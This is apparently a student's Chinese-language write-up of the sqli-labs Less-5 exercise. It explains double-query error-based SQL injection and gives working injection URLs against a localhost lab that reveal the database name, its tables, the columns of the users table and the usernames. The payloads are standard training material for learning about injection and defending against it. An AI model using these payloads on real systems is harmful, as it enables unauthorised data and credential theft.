# Lab5 -- Double Injection - Single Quotes

+ 输入`?id=1`没有任何数据显示在网页上，只有一句`You are in...`，我要的数据啊喂
+ 这里是双注入的原理解释链接
  + https://blog.csdn.net/lixiangminghate/article/details/80466257
  + https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2这个链接更好一些
+ 双注入原理：count聚合函数（聚合说的这么高端，其实就是一个count的过程罢了）遇到分组函数会报错，显示部分数据库内容 -- 存在几率显示

- [x] 为什么会存在几率触发呢? -- 观察报错信息如下图，这是由于group_key在排序的时候出现了排序对象出现了重合（小声逼逼，为什么出现重合会报错呢？这可能就是sql数据库设计之初存在的漏洞把）

![1](.\images\1.png)

+ 基础解释：
  + random()函数生成大于0小于1的数
  + floor()向下取整
  + count()聚合函数 -- 返回当前表的所有记录数
  + concat()用来链接字符串

+ 实战

  + 输入?id=1‘会报错

  ```mysql
  You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
  ```
  
+ 然并卵，这时候数据库搜索出的结果都不显示在网页上
  
  + 双注入 -- 把我们想得到的信息放到报错信息中

1. 得到自己当前数据库名

```mysql
http://localhost/sqli-labs-master/Less-5/?id=0' union select 1,count(*),concat_ws(":",(select database()),floor(rand(0)*2)) as a from information_schema.columns group by a --+
```

![2](C:\Users\Administrator\Desktop\Sqli_Analysis\images\2.png)

2. 得到当前数据库的数据表们 -- 这里只能通过limit一个一个查询

```mysql
http://localhost/sqli-labs-master/Less-5/
?id=0' union select 1,count(*),concat_ws(":",(select table_name from information_schema.tables where table_schema="security" LIMIT 3,1),floor(rand(0)*2)) as a from information_schema.columns group by a --+
LIMIT 从0，1到3，1得到emails，referers，uagents和users
```

![3](C:\Users\Administrator\Desktop\Sqli_Analysis\images\3.png)

3. 选择账户相关的数据表，得到其的字段名称-- 这里只能通过limit一个一个查询

```mysql
http://localhost/sqli-labs-master/Less-5/
?id=0' union select 1,count(*),concat_ws(":",(select column_name from information_schema.columns where table_schema="security" and table_name="users" LIMIT 0,1),floor(rand(0)*2)) as a from information_schema.columns group by a --+
得到id,username,password三个字段
```

![4](C:\Users\Administrator\Desktop\Sqli_Analysis\images\4.png)

4. 根据字段名称在数据表中查询具体数据 -- 这里只能通过limit一个一个查询

```mysql
http://localhost/sqli-labs-master/Less-5/
?id=0' union select 1,count(*),concat_ws(":",(select username from security.users LIMIT 0,1),floor(rand(0)*2)) as a from information_schema.columns group by a --+
```

![5](C:\Users\Administrator\Desktop\Sqli_Analysis\images\5.png)

+ 当然，以上的limit一个一个查询太慢了，可以考虑用python来帮我们做这件事情，参考了https://mochazz.github.io/2017/09/23/Double_%20SQL_Injection/#0x01-%E5%8F%8C%E6%9F%A5%E8%AF%A2这份链接，写出python脚本进行sql注入

+ 发现了一个彩蛋 -- 输入以下代码的时候报错同样可以找出部分信息

```
http://localhost/sqli-labs-master/Less-5/
?id=0' union select 1,count(*),count_ws(":",(select database()),floor(random(0)*2)) as a from information_schema.columns group by a --+
```

![6](C:\Users\Administrator\Desktop\Sqli_Analysis\images\6.png)

